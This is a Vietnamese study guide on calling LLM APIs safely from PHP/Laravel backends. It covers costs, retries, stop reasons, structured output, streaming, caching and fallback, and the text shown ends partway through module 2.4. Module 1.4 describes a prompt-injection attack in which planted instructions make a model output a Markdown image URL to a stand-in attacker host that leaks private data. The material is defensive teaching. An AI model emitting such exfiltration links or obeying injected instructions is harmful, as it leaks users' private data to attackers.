# 23. Tích hợp AI/LLM vào backend

> [← Mục lục](README.md) · Trọng tâm: **gọi LLM API an toàn từ backend PHP/Laravel**, structured output và tool use, RAG, agent và MCP, bảo mật, vận hành và eval. Dùng AI khi code (coding assistant, agent) là chủ đề khác, ở [26-ai-assisted-engineering.md](26-ai-assisted-engineering.md).
> Ký hiệu: 🟢 junior · 🟡 mid · 🔴 senior · ⚠️ cạm bẫy hay bị hỏi vặn.

File gồm hai phần:

1. **Lộ trình kiến thức** (phần chính): ba chặng từ nền tới senior. Mỗi module có:
   - **Vì sao cần học**: module này dùng vào việc gì và hay bị hỏi thế nào.
   - **Học gì**: các khái niệm, giải thích bằng lời thường kèm ví dụ, và các cạm bẫy ⚠️. Đọc phần
     này để biết cần học gì, rồi học sâu qua tài liệu ở mục Đọc.
   - **Đọc**: tài liệu gốc.
   - **Nắm chắc khi**: tiêu chí tự kiểm tra. Chỉ tick ô khi làm được điều đó mà không cần nhìn
     tài liệu.
2. **Câu hỏi thường gặp** (bonus): mỗi câu kèm hướng trả lời mong đợi, gồm ý phải có, điểm
   cộng senior và red flag. Dùng để kiểm tra sau khi học, không dùng để học thuộc.

Chủ đề này xuất hiện ngày càng nhiều trong JD backend. Phần lớn chỉ bị hỏi sâu khi JD có nhắc
AI/LLM; nếu không, nắm chặng 1 và module 3.1 là đủ. Người phỏng vấn backend không hỏi cách
train model; họ hỏi cách đưa một dependency **chậm, đắt, không tất định, và có thể bị thao túng
qua input** vào hệ thống production mà vẫn an toàn.

Tên model, giá, giới hạn context, rate limit của từng provider thay đổi rất nhanh nên **cố ý
không ghi** ở đây. Khi trả lời phỏng vấn, nói ở mức nguyên lý và nói "tôi sẽ kiểm tra tài liệu
hiện hành của provider".

---

## Tài liệu nền

Dùng xuyên suốt file. Các module bên dưới chỉ rõ đọc phần nào.

| Tài liệu | Loại | Dùng cho |
|---|---|---|
| [Claude Platform Docs](https://platform.claude.com/docs/en/build-with-claude/streaming) (Anthropic) | Official docs | Messages API, streaming, tool use, structured output, prompt caching, stop reason, eval |
| [OpenAI API docs](https://developers.openai.com/api/docs/guides/function-calling) | Official docs | Đối chiếu provider thứ hai: function calling, structured output, reasoning, prompt caching, moderation |
| [Model Context Protocol](https://modelcontextprotocol.io/docs/getting-started/intro) | Spec + docs | Chuẩn mở kết nối ứng dụng LLM với tool và dữ liệu |
| [OWASP Top 10 for LLM Applications](https://genai.owasp.org/llm-top-10/) (bản 2025) | Danh sách rủi ro | Khung bảo mật: prompt injection, output handling, excessive agency, unbounded consumption |
| [Simon Willison: Prompt injection](https://simonwillison.net/series/prompt-injection/) | Blog | Chuỗi bài theo dõi prompt injection từ 2022, dễ đọc, nhiều ví dụ thật |
| [Anthropic: Building effective agents](https://www.anthropic.com/engineering/building-effective-agents) | Blog kỹ thuật | Workflow so với agent, các pattern, khi nào **không** dùng agent |
| *AI Engineering* (Chip Huyen, O'Reilly 2025) | Sách | Toàn cảnh xây ứng dụng trên foundation model: eval, RAG, agent, tối ưu inference |
| [Laravel AI SDK](https://laravel.com/docs/ai-sdk) | Official docs | Lớp gọi nhiều provider trong Laravel: agent, tool, structured output, streaming, embedding |

---

## Lộ trình tổng

| Chặng | Module | Mục tiêu | Thời gian gợi ý |
|---|---|---|---|
| **1. Nền** 🟢 | 1.1–1.4 | Coi LLM là dependency ngoài: token, chi phí, timeout, retry, stop reason, structured output, không tin output | 3–4 ngày |
| **2. Làm chủ** 🟡 | 2.1–2.9 | Streaming qua PHP-FPM, chạy trong queue, kiểm soát chi phí, gateway và fallback, RAG, agent, MCP, quan sát | 10–12 ngày |
| **3. Senior** 🔴 | 3.1–3.5 | Prompt injection, phân quyền dữ liệu, guardrail, eval, bên trong vector search | 7–9 ngày |

Học theo thứ tự: chặng 2 xây trên phần timeout/retry và stop reason của chặng 1; chặng 3 chỉ có
nghĩa khi đã tự làm một luồng RAG hoặc agent ở chặng 2. Nên viết code thật với một provider
(có free tier hoặc model chạy local) thay vì chỉ đọc.

---

## Phần 1: Lộ trình kiến thức

### Chặng 1: Nền 🟢

#### 1.1 LLM là một dependency ngoài

**Vì sao cần học:** Đây là khung tư duy cho cả file. Người phỏng vấn backend muốn nghe bạn đối
xử với LLM như một dependency ngoài (giống payment gateway hay API vận chuyển), không phải phép
màu. Token và context window quyết định chi phí và giới hạn của mọi tính năng AI. Câu hay gặp:
"ước lượng chi phí tính năng này" và "vì sao chatbot càng dùng càng đắt".

**Học gì**

*Bốn tính chất khó chịu*
- Chậm: vài giây tới hàng chục giây, tỉ lệ với độ dài output, vì model sinh từng token một.
- Đắt: tính tiền theo token input và token output. Output thường đắt hơn input nhiều lần.
- Không tất định (*non-deterministic*): cùng một input có thể ra output khác nhau.
- Bị điều khiển bởi dữ liệu: nội dung input thay đổi được hành vi của model. Đây là *prompt
  injection* (module 3.1).

*Pattern backend quen thuộc áp vào bốn tính chất đó*
- Mọi kỹ thuật trong file này là pattern backend bạn đã biết:

  | Vấn đề | Pattern |
  |---|---|
  | Chậm | Timeout, queue, streaming |
  | Đắt | Cache, quota, giới hạn output |
  | Không tất định | Validate output, eval |
  | Bị điều khiển bởi dữ liệu | Validate, kiểm quyền, giới hạn tool |
  | Provider lỗi như mọi API ngoài | Retry, circuit breaker, fallback |

*Token và context window*
- *Token* là đơn vị model đọc và sinh ra: có thể là một từ, một phần của từ, hoặc một dấu câu.
  Token là đơn vị tính tiền và đơn vị của mọi giới hạn.
- Tiếng Việt thường tốn nhiều token hơn tiếng Anh cho cùng nội dung.
- *Context window* là tổng số token (input + output) mà model xử lý được trong một lần gọi.
- ⚠️ Model không nhớ gì giữa các lần gọi. Lịch sử hội thoại được gửi lại, và tính tiền lại, ở
  mỗi lượt:
  1. Lượt 1 gửi câu hỏi đầu tiên.
  2. Lượt 10 gửi cả 9 lượt hỏi đáp trước đó cộng câu hỏi mới.
  3. Chi phí mỗi lượt tăng dần, tới lúc chạm giới hạn context.

*Reasoning token*
- Một số model "suy nghĩ" trước khi trả lời: sinh ra một đoạn suy luận nội bộ, gọi là
  *reasoning token* hoặc *thinking token*.
- ⚠️ Tính tiền như output token và chiếm vào giới hạn output, dù có thể không hiện cho người
  dùng.
- ⚠️ Tăng latency rõ rệt, nhất là *time to first token* (thời gian tới khi chữ đầu tiên của câu
  trả lời xuất hiện).
- Chỉ bật (hoặc tăng mức) cho việc thật sự cần suy luận.

*Ước lượng chi phí*
- Công thức:
  chi phí ≈ input × đơn giá input + (output + reasoning) × đơn giá output.
- Cách ước lượng một tính năng:
  1. Ước lượng số request mỗi ngày.
  2. Đo số token input và output trung bình trên dữ liệu thật (API token counting đếm được
     trước khi gọi).
  3. Nhân với đơn giá hiện hành của provider, cộng phần reasoning nếu bật.

**Đọc**
- Anthropic: [Context windows](https://platform.claude.com/docs/en/build-with-claude/context-windows), [Extended thinking](https://platform.claude.com/docs/en/build-with-claude/extended-thinking) (phần tính tiền thinking token), [Token counting](https://platform.claude.com/docs/en/build-with-claude/token-counting)
- OpenAI: [Reasoning models](https://developers.openai.com/api/docs/guides/reasoning) (phần reasoning token và quản lý chi phí), [Conversation state](https://developers.openai.com/api/docs/guides/conversation-state)

**Nắm chắc khi**
- [ ] Ước lượng được chi phí một tính năng tóm tắt: số request/ngày × token input/output trung bình, kể cả reasoning
- [ ] Giải thích được vì sao chatbot càng nói chuyện lâu càng đắt, và 2 cách giảm
- [ ] Nói được khi nào bật reasoning có lợi và khi nào chỉ làm chậm và đắt thêm

#### 1.2 Gọi API: timeout, retry, stop reason

**Vì sao cần học:** Lời gọi LLM hỏng theo những cách API thường không có, ví dụ HTTP 200 nhưng
câu trả lời bị cắt dở. Retry đặt sai chỗ có thể nhân hoá đơn lên nhiều lần. Đây là phần người
phỏng vấn dùng để phân biệt người đã chạy LLM trên production với người mới gọi thử.

**Học gì**

*Timeout*
- Timeout dài hơn API thường, nhưng vẫn phải có. Không có timeout thì một request treo giữ
  worker mãi.
- Tách hai loại:
  - *Connect timeout*: thời gian tối đa để mở kết nối.
  - Tổng thời gian cho cả request. Khi stream thì dùng *read timeout*: thời gian tối đa chờ
    giữa hai lần nhận được dữ liệu.

*Lỗi nào retry, lỗi nào không*

| Retry được (lỗi tạm thời) | Không retry (gửi lại vẫn lỗi y hệt) |
|---|---|
| Timeout | 400: request sai |
| 429: vượt rate limit | Lỗi auth |
| 5xx | Vượt context window |
| Provider quá tải | Bị từ chối vì nội dung |

- *Exponential backoff + jitter*: khoảng chờ giữa các lần thử tăng gấp đôi (1s, 2s, 4s...),
  cộng thêm một khoảng ngẫu nhiên để nhiều client không cùng thử lại một lúc.
- Tôn trọng header `Retry-After` khi provider trả về.

*Retry nhân chi phí*
- ⚠️ Retry một request đắt là nhân chi phí. Giới hạn số lần thử.
- ⚠️ Retry chồng nhiều tầng:
  - SDK thường tự retry sẵn. SDK PHP của Anthropic mặc định retry 2 lần.
  - App bọc thêm một lớp retry.
  - Queue job lại có `$tries` riêng.
  - Các tầng nhân với nhau: thêm retry của app là nhân ba, thêm retry của queue là nhân chín.

*Rate limit và quota*
- Rate limit của provider tính theo số request mỗi phút và theo số token mỗi phút.
- Nhiều service dùng chung một API key thì dùng chung một hạn mức. Cần một lớp điều phối chung,
  nếu không service này làm service kia bị 429.
- Quota phía mình: mỗi user hoặc tenant một ngân sách, để một người không đốt tiền của cả hệ
  thống ([17-performance.md](17-performance.md)).

*Stop reason*
- Mỗi response có một trường cho biết vì sao model dừng sinh, gọi là *stop reason* (hoặc
  *finish reason*). **Luôn kiểm tra trường này trước khi dùng output.**

  | Provider | Trường | Giá trị cần biết |
  |---|---|---|
  | Anthropic | `stop_reason` | `end_turn` (xong bình thường), `max_tokens` (bị cắt), `tool_use` (muốn gọi tool), `refusal` (từ chối), `pause_turn`... |
  | OpenAI Chat Completions | `finish_reason` | `"length"`: bị cắt |
  | OpenAI Responses API | `status` | `"incomplete"` kèm lý do `max_output_tokens` |

- ⚠️ Chạm `max_tokens` thì output bị **cắt**: JSON thiếu ngoặc đóng, câu trả lời dở dang, tool
  call không đầy đủ. HTTP vẫn 200, không có exception nào.

  ```php
  $data = $response->json();
  if ($data['stop_reason'] === 'max_tokens') {
      throw new TruncatedOutputException();   // HTTP 200 nhưng output bị cắt, không parse bừa
  }
  ```
- Xử lý khi bị cắt: tăng giới hạn, yêu cầu model viết tiếp, hoặc báo lỗi rõ ràng.

**Đọc**
- Anthropic: [Errors](https://platform.claude.com/docs/en/api/errors), [Rate limits](https://platform.claude.com/docs/en/api/rate-limits), [Stop reasons](https://platform.claude.com/docs/en/build-with-claude/handling-stop-reasons)
- OpenAI: [Error codes](https://developers.openai.com/api/docs/guides/error-codes), [Rate limits](https://developers.openai.com/api/docs/guides/rate-limits)
- Retry và backoff chung: [Amazon Builders' Library: Timeouts, retries and backoff with jitter](https://aws.amazon.com/builders-library/timeouts-retries-and-backoff-with-jitter/)

**Nắm chắc khi**
- [ ] Phân loại được 8 mã lỗi/tình huống thành retry được và không retry được
- [ ] Viết được đoạn code xử lý đủ các stop reason, trong đó `max_tokens` không bị coi là thành công
- [ ] Tính được tổng số lần gọi provider tối đa khi SDK, app và queue đều có retry

#### 1.3 Structured output và tool use

**Vì sao cần học:** Phần lớn tính năng AI trong backend không phải chatbot, mà là trích xuất và
phân loại: đọc hoá đơn thành JSON, gắn nhãn ticket hỗ trợ. Structured output biến câu trả lời tự
do thành dữ liệu mà code dùng được. Tool use là nền của agent. Câu hay bị hỏi: "ai thực thi
tool".

**Học gì**

*Structured output*
- *Structured output*: yêu cầu model trả JSON theo một *JSON Schema*, tức bản mô tả cấu trúc
  (có field nào, kiểu gì, field nào bắt buộc).
- Nhiều provider có chế độ ràng buộc output theo JSON schema.
  - ⚠️ Mỗi provider chỉ hỗ trợ một tập con của JSON Schema.
- Dùng cho: trích xuất (hoá đơn, CV), phân loại, sinh tham số cho hệ thống khác.
- Ví dụ schema để phân loại ticket:

  ```json
  {
    "type": "object",
    "properties": {
      "category": { "type": "string", "enum": ["billing", "bug", "other"] },
      "priority": { "type": "integer", "minimum": 1, "maximum": 3 }
    },
    "required": ["category", "priority"]
  }
  ```

*Tool use*
- *Tool use* (OpenAI gọi là *function calling*): backend khai báo cho model một danh sách tool.
  Mỗi tool có tên, mô tả, và JSON schema của tham số.
- Model **không tự chạy gì**. Một lượt tool use diễn ra thế này:
  1. Backend gửi câu hỏi kèm danh sách tool.
  2. Model trả về "tôi muốn gọi tool X với tham số Y".
  3. Backend quyết định có chạy không, rồi chạy.
  4. Backend gửi kết quả lại cho model.
  5. Model dùng kết quả để trả lời, hoặc xin gọi thêm tool.
- Quyền thực thi nằm hoàn toàn ở backend. Đây là chỗ kiểm quyền, validate, giới hạn.

*Thiết kế tool*
- Mô tả tool rõ ràng quan trọng như tên hàm tốt: model chọn tool dựa vào mô tả.
- Ít tool mà rõ tốt hơn nhiều tool chồng chéo nhau.
- Tách tool đọc (an toàn) và tool ghi (kiểm soát chặt hơn).

**Đọc**
- Anthropic: [Tool use overview](https://platform.claude.com/docs/en/agents-and-tools/tool-use/overview), [Implement tool use](https://platform.claude.com/docs/en/agents-and-tools/tool-use/implement-tool-use), [Structured outputs](https://platform.claude.com/docs/en/build-with-claude/structured-outputs)
- OpenAI: [Function calling](https://developers.openai.com/api/docs/guides/function-calling), [Structured outputs](https://developers.openai.com/api/docs/guides/structured-outputs)
- Anthropic: [Writing effective tools for agents](https://www.anthropic.com/engineering/writing-tools-for-agents)

**Nắm chắc khi**
- [ ] Vẽ được sequence của một lượt tool use: request có tool → response `tool_use` → backend chạy → gửi `tool_result` → câu trả lời cuối
- [ ] Viết được JSON schema cho tool `search_orders` có enum trạng thái và khoảng ngày
- [ ] Giải thích được vì sao có chế độ ép schema rồi vẫn phải validate phía mình

#### 1.4 Không tin output LLM

**Vì sao cần học:** LLM có thể bịa và có thể bị điều khiển qua input, nên output của nó nguy
hiểm y như dữ liệu người dùng gõ vào form. Lỗ hổng thật thường không nằm ở model, mà ở chỗ
backend dùng output: render ra HTML, chạy SQL, gọi URL. Red flag hay gặp: "đã bật JSON mode nên
không cần validate".

**Học gì**

*Coi output như input không tin cậy*
- Đối xử với output của LLM như request từ một user không tin cậy: validate, escape, kiểm quyền.
- Validate cả nghiệp vụ, không chỉ kiểu dữ liệu:
  - Enum, khoảng giá trị, field bắt buộc.
  - Ràng buộc chéo, ví dụ tổng tiền phải khớp tổng các dòng.
- Model có thể bịa ID, URL, số liệu, tên tool không tồn tại.
- Trong Laravel, validate output như validate form, rồi mới kiểm tra nghiệp vụ:

  ```php
  $data = Validator::make($llmOutput, [
      'total'    => ['required', 'numeric', 'min:0'],
      'currency' => ['required', Rule::in(['VND', 'USD'])],
  ])->validate();
  ```

*Tham số tool*
- Tham số tool do model sinh ra phải qua cùng lớp validation và authorization như request từ API
  công khai.
- User hiện tại không có quyền thì tool cũng không có quyền.
  - Ví dụ: tool `get_order(order_id)` phải kiểm tra đơn đó thuộc về user đang chat, không tin
    `order_id` mà model đưa.

*Chuẩn bị cho output hỏng*
- Các kiểu hỏng: JSON không parse được, thiếu field, bị cắt vì `max_tokens`.
- Luôn có nhánh xử lý:
  - Retry có giới hạn, gửi kèm lỗi để model sửa.
  - Trả lỗi rõ ràng.
  - Fallback (module 2.4).

*Output gây lỗ hổng ở hệ thống phía sau*
- OWASP (tổ chức phi lợi nhuận về bảo mật ứng dụng) xếp nhóm này là LLM05 Improper Output
  Handling.
- Render HTML/Markdown không escape gây *XSS* (chèn script chạy trên trình duyệt của người khác).
- ⚠️ Ảnh hoặc link Markdown trỏ tới URL của kẻ tấn công để gửi dữ liệu ra ngoài:
  1. Kẻ tấn công cài chỉ thị vào dữ liệu model đọc, bảo model chèn một ảnh Markdown.
  2. Model làm theo, output chứa `![](https://evil.example/x?d=<dữ liệu riêng tư>)`.
  3. Trình duyệt tự tải ảnh, gửi dữ liệu nằm trong URL tới server kẻ tấn công. User không cần
     bấm gì.
- Model sinh SQL:
  - Dùng user DB chỉ đọc, giới hạn bảng, đặt timeout.
  - Tốt hơn là cho model chỉ chọn tham số cho các query viết sẵn.
- Lệnh shell, đường dẫn file, URL: dùng allowlist. Không truyền thẳng vào `exec`,
  `file_get_contents`, HTTP client.
  - URL do model sinh đưa vào HTTP client có thể gây *SSRF*: server bị lừa gọi vào địa chỉ nội
    bộ mà bên ngoài không gọi được.
- Liên hệ bảo mật chung: [10-security.md](10-security.md)

**Đọc**
- OWASP: [Top 10 for LLM Applications](https://genai.owasp.org/llm-top-10/): đọc LLM05 (Improper Output Handling) và LLM06 (Excessive Agency)

**Nắm chắc khi**
- [ ] Viết được lớp validate cho output trích xuất hoá đơn, bắt được ít nhất 5 kiểu output sai
- [ ] Chỉ ra được đường rò dữ liệu qua ảnh markdown trong một chatbot render Markdown

---

### Chặng 2: Làm chủ 🟡

#### 2.1 Streaming

**Vì sao cần học:** Câu trả lời của LLM mất vài chục giây mới xong. Không stream thì user nhìn
màn hình trống suốt thời gian đó. Streaming làm chữ hiện dần, cảm giác nhanh hơn nhiều. Sự cố
kinh điển hay bị hỏi: chạy local thì chữ hiện dần, lên staging thì ra một cục ở cuối.

**Học gì**

*Streaming hoạt động thế nào*
1. Backend gọi provider ở chế độ stream.
2. Provider trả từng mẩu token qua *Server-Sent Events* (SSE): một response HTTP được giữ mở,
   server ghi dần từng event dạng text.
3. Backend chuyển tiếp cho trình duyệt qua SSE (`Content-Type: text/event-stream`) hoặc
   WebSocket.

- Một event SSE thô trông như sau:

  ```
  event: content_block_delta
  data: {"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"Xin"}}
  ```
- Metric quan trọng là **time to first token** (TTFT), không chỉ tổng thời gian.

*Cạm bẫy khi stream*
- ⚠️ *Reverse proxy* (server đứng trước app, như Nginx) *buffer* response, tức gom đủ rồi mới
  gửi, thì stream thành một cục ở cuối.
  - Tắt buffering cho route đó.
  - Tăng read timeout ([02-networking.md](02-networking.md)).
- ⚠️ Client ngắt giữa chừng: phải huỷ request tới provider, để không trả tiền cho token không ai
  đọc.
- ⚠️ Validate hoặc lọc output khi đang stream khó hơn: chữ đã gửi thì không rút lại được.
  - Output cần kiểm duyệt chặt thì không stream.
  - Hoặc kiểm từng đoạn trước khi gửi.
- Stream có thể lỗi giữa chừng: đã nhận nửa câu trả lời rồi mới tới event lỗi. Client phải xử
  lý trạng thái dở dang này.
- Structured output và tool use khi stream: JSON tới từng mảnh, chỉ parse khi block kết thúc.

**Đọc**
- Anthropic: [Streaming Messages](https://platform.claude.com/docs/en/build-with-claude/streaming) (các loại event, lỗi giữa stream)
- OpenAI: [Streaming API responses](https://developers.openai.com/api/docs/guides/streaming-responses)
- MDN: [Using server-sent events](https://developer.mozilla.org/en-US/docs/Web/API/Server-sent_events/Using_server-sent_events)
- Nginx: [`proxy_buffering`](https://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_buffering), [`proxy_read_timeout`](https://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_read_timeout)

**Nắm chắc khi**
- [ ] Đọc được một stream SSE thô bằng `curl -N` và chỉ ra event bắt đầu, delta, kết thúc
- [ ] Giải thích được vì sao stream chạy local mà lên staging thì ra một cục, và 3 chỗ có thể đang buffer

#### 2.2 Tầng PHP: gọi LLM từ PHP-FPM và Laravel

**Vì sao cần học:** Module riêng cho người làm PHP. PHP-FPM chạy mô hình một request một
worker: worker đang chờ LLM 30 giây thì không phục vụ được ai khác. Vì vậy lời gọi LLM (chậm,
dài) nguy hiểm với PHP-FPM hơn nhiều so với Go hoặc Java, nơi chờ I/O rẻ hơn. Câu hay gặp: "tính
năng AI làm hết FPM worker giờ cao điểm, sửa thế nào".

**Học gì**

*Thư viện*

| Thư viện | Loại | Ghi chú |
|---|---|---|
| `anthropic-ai/sdk` | SDK PHP chính thức của Anthropic | PHP 8.1+, đang beta. Dùng PSR-18 (chuẩn interface HTTP client của PHP); stream cần HTTP client trả body dần, như Guzzle |
| `openai-php/client` | Thư viện cộng đồng | OpenAI không có SDK PHP chính thức; đây là thư viện phổ biến |
| `laravel/ai` (Laravel AI SDK) | Chính thức của Laravel | Một API cho nhiều provider: agent, tool, structured output, streaming, embedding |
| Prism | Thư viện cộng đồng | Lựa chọn cộng đồng cho Laravel |
| Laravel HTTP client, Guzzle, Symfony HttpClient | Gọi thẳng API | Vẫn nên bọc sau interface của mình (module 2.4) |

*Timeout nhiều tầng*
- Một request đi qua nhiều tầng, mỗi tầng có timeout riêng. Tầng nào ngắn nhất sẽ cắt trước.

  | Tầng | Cấu hình | Ghi chú |
  |---|---|---|
  | HTTP client | Laravel `connectTimeout()`, `timeout()`. Guzzle `connect_timeout`, `timeout`, `read_timeout` khi stream | |
  | PHP | `max_execution_time` | ⚠️ Trên Linux không tính thời gian chờ I/O, nên không cứu được request LLM bị treo |
  | PHP-FPM | `request_terminate_timeout` | |
  | Nginx | `fastcgi_read_timeout` | Mặc định 60 giây |

*Không gọi đồng bộ trong request web cho tác vụ dài*
- Chuỗi sự cố:
  1. Mỗi request chờ LLM chiếm một FPM worker suốt thời gian chờ.
  2. 50 request LLM, mỗi cái chờ 30 giây, là cạn `pm.max_children` của một pool 50 worker.
  3. Request bình thường (trang chủ, đăng nhập) phải xếp hàng, cả site đứng.
- Cách sửa là đưa vào queue job:
  1. Controller đẩy job vào queue, trả `202 Accepted` kèm job id.
  2. Queue worker gọi LLM và lưu kết quả.
  3. Client poll theo job id, hoặc nhận kết quả qua broadcasting (WebSocket, Laravel Reverb)
     hoặc webhook ([12-messaging.md](12-messaging.md)).
- Cấu hình job:
  - Đặt `$timeout`, `$tries`, `backoff`.
  - ⚠️ `retry_after` (trong config queue) phải lớn hơn `$timeout`. Nếu không, job đang chạy dở
    bị coi là đã chết và được giao cho worker khác chạy lại.
  - Giới hạn tốc độ gọi provider bằng rate limiting middleware của queue (`RateLimited`,
    `Redis::throttle`).
- ⚠️ Job retry là gọi provider lại và trả tiền lại.
  - Lưu kết quả ngay khi có.
  - Đầu job kiểm tra đã có kết quả thì bỏ qua. Tính chất "chạy nhiều lần cũng như một lần" này
    gọi là *idempotent*.

*Streaming qua PHP-FPM và Nginx*
- Laravel: `response()->stream()` hoặc `eventStream()`.
- Tắt output buffering của PHP: cấu hình `output_buffering`, và gọi `ob_flush()` + `flush()`
  sau mỗi mẩu gửi đi.
- Nginx buffer response của FastCGI. Tắt bằng một trong hai cách:
  - App trả header `X-Accel-Buffering: no`.
  - Cấu hình `fastcgi_buffering off` cho location đó.
- Tắt gzip cho route stream.
- ⚠️ Mỗi stream giữ một FPM worker suốt thời gian stream. Traffic lớn thì:
  - Tách phần stream sang runtime chạy lâu (Octane/FrankenPHP, hoặc một service Go).
  - Hoặc dùng queue + broadcasting.
- ⚠️ PHP chỉ biết client đã ngắt kết nối khi cố ghi ra. Kiểm tra `connection_aborted()` sau mỗi
  lần flush để dừng đọc stream từ provider.

*Process sống lâu*
- Queue worker và Octane là process sống lâu, không chết sau mỗi request như FPM.
  - Lợi: giữ được HTTP client để dùng lại connection.
  - ⚠️ Hại: state có thể rò giữa các job hoặc request ([05-php-laravel.md](05-php-laravel.md)).

**Đọc**
- Anthropic: [PHP SDK](https://platform.claude.com/docs/en/api/sdks/php) (phần streaming, retries, error handling), [anthropic-sdk-php](https://github.com/anthropics/anthropic-sdk-php)
- OpenAI: [Libraries](https://developers.openai.com/api/docs/libraries) (danh sách SDK chính thức và thư viện cộng đồng); [openai-php/client](https://github.com/openai-php/client)
- Laravel: [AI SDK](https://laravel.com/docs/ai-sdk), [HTTP Client](https://laravel.com/docs/http-client) (mục [Timeout](https://laravel.com/docs/http-client#timeout), [Retries](https://laravel.com/docs/http-client#retries)), [Event Streams](https://laravel.com/docs/responses#event-streams), [Queues](https://laravel.com/docs/queues) (mục [Worker timeouts](https://laravel.com/docs/queues#worker-timeouts))
- Guzzle: [Request options](https://docs.guzzlephp.org/en/stable/request-options.html) (mục [stream](https://docs.guzzlephp.org/en/stable/request-options.html#stream), [read_timeout](https://docs.guzzlephp.org/en/stable/request-options.html#read-timeout)); Symfony: [HttpClient streaming responses](https://symfony.com/doc/current/http_client.html#streaming-responses)
- Nginx: [`fastcgi_buffering`](https://nginx.org/en/docs/http/ngx_http_fastcgi_module.html#fastcgi_buffering) (có ghi chú về header `X-Accel-Buffering`), [`fastcgi_read_timeout`](https://nginx.org/en/docs/http/ngx_http_fastcgi_module.html#fastcgi_read_timeout)
- PHP: [Connection handling](https://www.php.net/manual/en/features.connection-handling.php), [`connection_aborted`](https://www.php.net/manual/en/function.connection-aborted.php), [`flush`](https://www.php.net/manual/en/function.flush.php)

**Nắm chắc khi**
- [ ] Stream được câu trả lời từ provider tới trình duyệt qua Nginx + PHP-FPM, chữ hiện dần chứ không ra một cục (bài tập 6)
- [ ] Tính được số request LLM đồng thời làm cạn FPM pool của hệ thống mình
- [ ] Viết được queue job gọi LLM idempotent: chạy lại không gọi provider lần hai nếu đã có kết quả
- [ ] Liệt kê được mọi tầng timeout từ trình duyệt tới provider và tầng nào cắt trước

#### 2.3 Chi phí và caching

**Vì sao cần học:** Hoá đơn LLM có thể tăng gấp mấy lần chỉ sau một lần đổi prompt, và người
phỏng vấn hay hỏi đúng tình huống đó. Prompt caching là cách giảm chi phí và latency hiệu quả,
nhưng có nhiều điều kiện ngầm: bật sai thì không có tác dụng mà cũng không báo lỗi.

**Học gì**

*Giảm chi phí*
- Prompt gọn.
- Chỉ đưa context cần thiết: RAG lấy ít chunk mà đúng (module 2.5).
- Giới hạn độ dài output.
- Dùng model nhỏ cho việc dễ (module 2.4).
- *Batch API* cho việc không gấp: gửi một lô request, rẻ hơn, nhưng kết quả trả sau, có thể tới
  hàng giờ.
- Theo dõi chi phí theo feature, tenant, ngày. Cảnh báo khi vượt ngưỡng.

*Prompt caching phía provider*
- *Prompt caching*: phần đầu prompt giống hệt nhau giữa các request (system prompt, định nghĩa
  tool, tài liệu dài) được provider cache lại, giảm chi phí và latency.
- Khớp theo **tiền tố chính xác**: provider so từ đầu prompt, gặp chỗ khác đầu tiên là dừng.
  Vì vậy đặt phần cố định lên đầu, phần thay đổi xuống cuối:

  ```
  [system prompt] [định nghĩa tool] [tài liệu dài]   ← giống nhau mọi request, được cache
  [lịch sử hội thoại] [câu hỏi mới]                  ← thay đổi, đặt ở cuối
  ```
- ⚠️ Có **ngưỡng độ dài tối thiểu** (vài trăm tới vài nghìn token tuỳ model). Prompt ngắn hơn
  thì không được cache, và thường không báo lỗi gì.
- ⚠️ Cách bật khác nhau giữa các provider:
  - Có provider cache tự động.
  - Có provider yêu cầu **đánh dấu tường minh**. Anthropic dùng `cache_control`, đặt breakpoint
    trên từng block hoặc một cờ cho cả request.
- Giá: ghi vào cache có thể đắt hơn input thường, đọc từ cache rẻ hơn nhiều.
- Cache sống ngắn: mặc định vài phút, có tuỳ chọn lâu hơn.
- ⚠️ Chèn timestamp, request id, hoặc để thứ tự tool thay đổi ở đầu prompt là phá cache toàn bộ.
- Kiểm tra hiệu quả qua field usage trong response (số token đọc và ghi cache), đừng đoán.

*Cache kết quả phía mình*
- Cache key là hash của (model, prompt đã chuẩn hoá, tham số).
- Hợp với việc gần tất định: phân loại, trích xuất, embedding của cùng một văn bản.
- ⚠️ *Semantic cache* (câu hỏi gần giống thì trả lại câu trả lời cũ) dễ trả sai ngữ cảnh. Ví dụ
  "huỷ đơn 123" và "huỷ đơn 124" rất gần nghĩa nhưng cần câu trả lời khác nhau.
- ⚠️ Cache không được trộn dữ liệu giữa các user có quyền khác nhau
  ([11-cache.md](11-cache.md)).

**Đọc**
- Anthropic: [Prompt caching](https://platform.claude.com/docs/en/build-with-claude/prompt-caching) (ngưỡng tối thiểu, breakpoint, TTL, cách đọc usage), [Batch processing](https://platform.claude.com/docs/en/build-with-claude/batch-processing)
- OpenAI: [Prompt caching](https://developers.openai.com/api/docs/guides/prompt-caching), [Batch API](https://developers.openai.com/api/docs/guides/batch)

**Nắm chắc khi**
- [ ] Sắp xếp lại một prompt thật để tận dụng cache, và chứng minh bằng số token cache đọc được trong response
- [ ] Giải thích được vì sao bật prompt caching mà hoá đơn không giảm (3 nguyên nhân)
- [ ] Thiết kế được cache key cho kết quả phân loại mà không lộ dữ liệu giữa tenant

#### 2.4 Chọn model, fallback và LLM gateway

**Vì sao cần học:** Provider LLM cũng sập, cũng đổi giá, cũng ra model mới liên tục. Hệ thống
tốt phải đổi được provider hoặc model mà không sửa nghiệp vụ, và vẫn chạy khi provider chính
chết. Câu hay hỏi: "provider chính bị sự cố một giờ thì hệ thống của bạn làm gì".

**Học gì**

*Chọn model*
- Trục đánh đổi: chất lượng, latency, chi phí, độ dài context.
- *Routing*: việc đơn giản (phân loại, trích field) dùng model nhỏ, việc khó mới dùng model lớn.
  Có thể thử model nhỏ trước, không đạt tiêu chí thì chuyển lên model lớn.
- Quyết định bằng *eval set* của chính mình (bộ input thật kèm tiêu chí chấm, module 3.4), không
  bằng benchmark chung.
- ⚠️ Cố định phiên bản model khi có thể. Alias kiểu "mới nhất" làm hành vi đổi mà không có lần
  deploy nào.

*Lớp adapter*
- Bọc provider sau interface của mình, như bọc payment gateway:
  - Đổi provider không phải sửa code nghiệp vụ.
  - Test được bằng fake trả output định sẵn.

*Fallback*
- Provider chính lỗi thì có hai hướng:
  - Chuyển sang model hoặc provider phụ.
  - Giảm chức năng (*graceful degradation*): tắt AI, trả kết quả không có AI.
- *Circuit breaker*: đếm lỗi, vượt ngưỡng thì ngừng gọi provider đó một thời gian, để không dồn
  request vào provider đang chết.
- ⚠️ Prompt tối ưu cho model A chưa chắc tốt với model B. Fallback phải được eval trước.
